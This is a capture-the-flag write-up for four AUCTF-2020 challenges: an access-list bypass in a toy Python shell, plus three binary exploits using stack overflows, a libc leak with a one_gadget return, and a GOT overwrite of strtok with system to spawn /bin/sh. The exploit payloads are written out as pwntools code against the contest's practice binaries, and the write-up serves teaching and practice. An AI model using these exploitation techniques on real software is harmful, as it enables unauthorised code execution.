# AUCTF-2020

Fri, 03 April 2020, 21:00 CST — Mon, 06 April 2020, 12:00 CST

**On-line**

An [AUCTF](https://ctftime.org/ctf/425) event.

Format: Jeopardy ![Jeopardy](https://ctftime.org/static/images/ct/1.png)

Official URL: https://ctf.auburn.edu/

**This event's weight is subject of [public voting](https://ctftime.org/event/1020/weight/)!**

Rating weight: 0 

**Event organizers** 

- [AUEHC](https://ctftime.org/team/82180)

------

## Easy as Pie!

### Description

> My friend just spent hours making this custom shell! He's still working on it so it doesn't have much. But we can do some stuff! He even built a custom access control list for controlling if you can access files.
>
> Check it out!
>
> `nc challenges.auctf.com 30010`
>
> Author: kensocolo

### Analysis

access to the python shell and type `help`:

```shell
% nc challenges.auctf.com 30010
Welcome to my custom shell written in Python! To get started type `help`
user@pyshell$ help

Use help <command> for help on specific command.
================================================
cat  help  ls  write

```

try `ls` command:

```shell
user@pyshell$ ls
acl.txt
user.txt
flag.txt
```

here are 3 files, try to `cat` them:

```shell
user@pyshell$ cat flag.txt
Don't have da permzzz
user@pyshell$ cat user.txt
this is some user content. I bet u wish the flag was here
user@pyshell$ cat acl.txt
user.txt:user:600
.acl.txt:root:600
.flag.txt:user:600
flag.txt:root:600
acl.txt:root:606
user@pyshell$ cat .flag.txt
nope not here sorry :)
user@pyshell$ cat .acl.txt
Don't have da permzzz
```

>  we can find two hidden files after `cat acl.txt`

the owner of both `flag.txt` and `.acl.txt` are `root` and the privileges are `600`, so only user `root` can read them.

type `help write`, we can find that the `write` command can add lines to the beginning of files

```shell
user@pyshell$ help write   

        write <content> <filename>
        adds content to the beginning of the file.
       
```

### Solution

?> maybe `acl.txt` means _**a**ccess **c**ontro**l**_?

so, try to add access control rules to `acl.txt`

```shell
user@pyshell$ write flag.txt:user:666 acl.txt
flag.txt:user:666
user@pyshell$ write .acl.txt:user:666 acl.txt
.acl.txt:user:666
```

`cat` works after rules added :D

```shell
user@pyshell$ cat flag.txt
aUctf_{h3y_th3_fl4g}
user@pyshell$ cat .acl.txt
auctf{h4_y0u_g0t_tr0ll3d_welC0m#_t0_pWN_l@nd}
```



## Thanksgiving Dinner

### Description
> I just ate a huge dinner. I can barley eat anymore... so please don't give me too much!
>
> `nc challenges.auctf.com 30011` 
>
> Note: ASLR is disabled for this challenge 
>
> Author: nadrojisk

### Attachment
[turkey](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/AUCTF2020/pwn/turkey/turkey)

### Analysis

#### buffer overflow

```c
void vulnerable(void){
  char local_30 [16];
  int local_20;
  int local_1c;
  int local_18;
  int local_14;
  int local_10;
  
  puts("Hey I heard you are searching for flags! Well I\'ve got one. :)");
  puts("Here you can have part of it!");
  puts("auctf{");
  puts("\nSorry that\'s all I got!\n");
  local_10 = 0;
  local_14 = 10;
  local_18 = 0x14;
  local_1c = 0x14;
  local_20 = 2;
  fgets(local_30,0x24,stdin);
  if ((((local_10 == 0x1337) && (local_14 < -0x14)) && (local_1c != 0x14)) &&
     ((local_18 == 0x667463 && (local_20 == 0x2a)))) {
    print_flag();
  }
  return;
}
```

here is a buffer overflow obviously: 

```
fgets(local_30,0x24,stdin)
```

!> `local_30` is only 16 bytes

so, our input will **overwrite** to `local_20` ... `local_10` after 16 bytes of any char.

### Solution

```python
offset = 16
payload = cyclic(offset)
payload += p32(0x2a)       # local_20 == 0x2a
payload += p32(0xdeadbeef) # local_1c != 0x14
payload += p32(0x667463)   # local_18 == 0x667463
payload += p32(0xdeadbeef) # local_14 < -0x14
payload += p32(0x1337)     # local_10 == 0x1337
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/AUCTF2020/pwn/turkey) 



## House of Madness

### Description
> Welcome to the House of Madness. Can you pwn your way to the keys to get the relic?
>
> nc challenges.auctf.com 30012
>
> Note: ASLR is disabled for this challenge
>
> Author: kensocolo
>
> Edit: this challenge's binary was originally a little weird. try this again!

### Attachment
[challenge](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/AUCTF2020/pwn/challenge/challenge)

### Analysis

we can `unlockHiddenRoom4` by entering room4 and inputing key `Stephen`

```c
void room4(void){
  int iVar1;
  char local_2c [16];
  char local_1c [20];
  
  puts("Wow this room is special. It echoes back what you say!");
  while( true ) {
    if (unlockHiddenRoom4 != '\0') {
      puts("Welcome to the hidden room! Good Luck");
      printf("Enter something: ");
      gets(local_1c);
      return;
    }
    printf("Press Q to exit: ");
    fgets(local_2c,0x10,stdin);
    remove_newline(local_2c);
    printf("\tYou entered \'%s\'\n",local_2c);
    iVar1 = strcmp(local_2c,"Q");
    if (iVar1 == 0) break;
    iVar1 = strcmp(local_2c,"Stephen");
    if (iVar1 == 0) {
      unlockHiddenRoom4 = '\x01';
    }
  }
  return;
}
```

#### buffer overflow

we got a buffer overflow `gets(local_1c)` after hidden room 4 is unlocked.

#### disabled ASLR

In the Description we know that:

?> Note: **ASLR is disabled** for this challenge

**ASLR is disabled** means the base address of `text` and `libc` is a **constant**:

```python
text = 0x56555000
libc = 0xf7e19000
```

so we can get shell directly by overwrite the return address to one gadget.

### Solution

#### leak libc

before the attack, we should know the version of remote `libc`. leak it:

```python
offset = cyclic_find('haaa')-8
payload = cyclic(offset)
payload += p32(got)
payload += p32(0xdeadbeef)
payload += p32(text+elf.plt['puts']) + p32(0xdeadbeef) + p32(text+elf.got['puts']) 

sla('Your choice: ','2')
sla('Choose a room to enter: ','4')
sla('Your choice: ','3')
sla('Press Q to exit: ','Stephen')
# debug('b *0x56556684')
sla('Enter something: ',payload)
puts = uu32(rc(4))
info_addr('puts',puts)
```

> output: puts: 0xf7e78b80

find libc version by `libc_database`:

```shell
% ./find puts b80
archive-glibc (id libc6_2.23-0ubuntu3_i386)
```

#### one gadget

search one gadget by `one_gadget`:

```shell
% one_gadget libc6_2.23-0ubuntu3_i386.so 
0x3ac3c execve("/bin/sh", esp+0x28, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x28] == NULL
```

#### get shell

the constraints is `[esp+0x28] == NULL`, so we should fill stack with `\x00` :

```python
# gadget
og_off = 0x3ac3c
og = libc+og_off

offset = cyclic_find('haaa')
payload = cyclic(offset)
payload += p32(og)
payload += p32(0)*100   # fill stack with '\x00'
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/AUCTF2020/pwn/challenge) 



## Remote School

### Description

  > Dear Student,
  >
  > Due to COVID-19 concerns our curriculum will be moving completely to online courses... I know we haven't even started our school year yet so this may come as a shock. But I promise it won't be too bad! You can login at challenges.auctf.com 30013.
  >
  > Best, Dean of Eon Pillars
  >
  > Note: ASLR is disabled for this challenge
  >
  > Author: nadrojisk


### Attachment

[online](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/AUCTF2020/pwn/online/online)

### Analysis

#### hidden function

 `class_hacker` is not in the list, but we can input `attend Hacker` to take this class :)

```c
void class_hacker(void){
  char local_200c [8196];
  
  puts("\nWelcome!");
  fgets(local_200c,0x2000,stdin);
  printf("Got %s\n",local_200c);
  test(local_200c);
  return;
}
```

```c
void test(char *param_1){
  char local_814 [2048];
  undefined4 local_14;
  undefined4 *local_10;
  
  printf("0x%x\n",&stack0xfffffffc);
  strncpy(local_814,param_1,2056);
  *local_10 = local_14;
  printf("0x%x\n",local_14);
  return;
}
```

#### buffer overflow

bof in function `test`:

```c
strncpy(local_814,param_1,2056);
```

!> `local_814` is only 2048 bytes

so, our input will **overwrite** to `local_14` and `local_10` after 2048 bytes of any char.

#### overwrite memory

also in function `test`:  

```c
*local_10 = local_14;
```

4 bytes of **arbitrary** memory can be overwrote, and both `local_14` and `local_10` can be assigned by buffer overflow.

#### disabled ASLR

ASLR is still disabled.

In addition, the version libc is same as [House of Madness](http://note.taqini.space/#/ctf/AUCTF-2020/?id=house-of-madness), so we can know the address of any function in libc directly. 

### Solution

#### GOT overwrite attack

we can overwrite the GOT of `strtok` to `system` 

```python
libcbase = 0xf7e19000
system = libcbase+0x0003ad80
strtok_got = 0x5655904c

offset = 2048
payload = 'A'*offset
payload += p32(system)
payload += p32(strtok_got)

sla('\tName: ','TaQini')
sla('> [? for menu]: ','attend Hacker')
# debug('b *0x56556591')
sla('Welcome!\n',payload)
```

#### WHY strtok?

after `class_hacker` , we will back to the menu to input next **cmd string**

`strtok` called in `cmd_dispatch` shared the first args which we input in **cmd string**

so we can trigger `strtok("/bin/sh")` by input `"/bin/sh"` as **cmd string**

```python
# strtok(cmd) -> system(cmd)
sla('> [? for menu]: ','/bin/sh')
```

in fact, `system("/bin/sh")` was executed. 

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/AUCTF2020/pwn/online) 